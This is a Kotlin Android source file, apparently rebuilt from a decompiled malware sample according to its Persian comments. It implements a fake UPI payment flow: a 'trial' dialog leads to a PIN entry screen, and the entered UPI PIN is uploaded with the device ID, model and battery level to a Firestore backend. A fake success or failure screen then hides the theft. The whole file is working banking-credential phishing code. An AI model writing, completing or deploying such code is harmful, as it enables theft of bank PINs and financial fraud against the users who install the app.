package com.payload.jansiix0ne.ui

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import androidx.compose.runtime.*
import androidx.compose.ui.platform.LocalContext
import com.payload.jansiix0ne.data.model.DeviceModel
import com.payload.jansiix0ne.data.repository.FirestoreRepository
import com.payload.jansiix0ne.ui.screens.HomeScreen
import com.payload.jansiix0ne.ui.screens.PaymentFailedScreen
import com.payload.jansiix0ne.ui.screens.PaymentSuccessScreen
import com.payload.jansiix0ne.ui.screens.TrialDialog
import com.payload.jansiix0ne.ui.screens.UPIPinScreen
import com.payload.jansiix0ne.util.SmsHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

@Composable
fun MainScreen() {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val firestoreRepository = remember { FirestoreRepository() }
    
    var showTrialDialog by remember { mutableStateOf(false) }
    var showUPIPinScreen by remember { mutableStateOf(false) }
    var showSuccessScreen by remember { mutableStateOf(false) }
    var showFailedScreen by remember { mutableStateOf(false) }
    var isProcessingPin by remember { mutableStateOf(false) }
    var currentPin by remember { mutableStateOf("") }
    
    // Success Screen
    if (showSuccessScreen) {
        PaymentSuccessScreen(
            onClose = {
                showSuccessScreen = false
                showUPIPinScreen = false
            }
        )
    }
    
    // Failed Screen
    if (showFailedScreen) {
        PaymentFailedScreen(
            onRetry = {
                showFailedScreen = false
                showUPIPinScreen = true
            },
            onClose = {
                showFailedScreen = false
                showUPIPinScreen = false
            }
        )
    }
    
    // UPI PIN Screen
    if (showUPIPinScreen && !showSuccessScreen && !showFailedScreen) {
        UPIPinScreen(
            onPinEntered = { pin ->
                // منطق پردازش PIN مطابق کد decompiled
                isProcessingPin = true
                currentPin = pin
                scope.launch(Dispatchers.IO) {
                    try {
                        val deviceId = SmsHelper.getDeviceId(context)
                        
                        // ساخت DeviceModel قبل از ارسال PIN (مطابق کد decompiled)
                        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                        val batteryLevel = batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 0
                        
                        val deviceModel = DeviceModel(
                            deviceId = deviceId,
                            mobileName = "${Build.MANUFACTURER} ${Build.MODEL}",
                            charge = "$batteryLevel%"
                        )
                        
                        // ذخیره DeviceModel (اگر وجود نداشته باشد)
                        firestoreRepository.saveDeviceInfo(deviceId, deviceModel)
                        
                        // ایجاد Map با کلید "upiPin" مطابق کد decompiled
                        val userFields = mapOf("upiPin" to pin.trim())
                        
                        // ارسال به Firestore
                        val result = firestoreRepository.saveUserFields(userFields, deviceId)
                        
                        // در صورت موفقیت یا خطا، callback را فراخوانی می‌کنیم
                        if (result.isSuccess && result.getOrNull() == true) {
                            // موفقیت - نمایش صفحه موفقیت
                            isProcessingPin = false
                            showUPIPinScreen = false
                            showSuccessScreen = true
                        } else {
                            // خطا - نمایش صفحه خطا
                            isProcessingPin = false
                            showUPIPinScreen = false
                            showFailedScreen = true
                        }
                    } catch (e: Exception) {
                        // خطا - نمایش صفحه خطا
                        isProcessingPin = false
                        showUPIPinScreen = false
                        showFailedScreen = true
                    }
                }
            },
            onCancel = {
                if (!isProcessingPin) {
                    showUPIPinScreen = false
                }
            }
        )
    }
    
    // Home Screen
    if (!showUPIPinScreen && !showSuccessScreen && !showFailedScreen) {
        HomeScreen(
            onGetStartedClick = {
                showTrialDialog = true
            }
        )
        
        if (showTrialDialog) {
            TrialDialog(
                onAccept = {
                    showTrialDialog = false
                    showUPIPinScreen = true
                },
                onDismiss = {
                    showTrialDialog = false
                }
            )
        }
    }
}
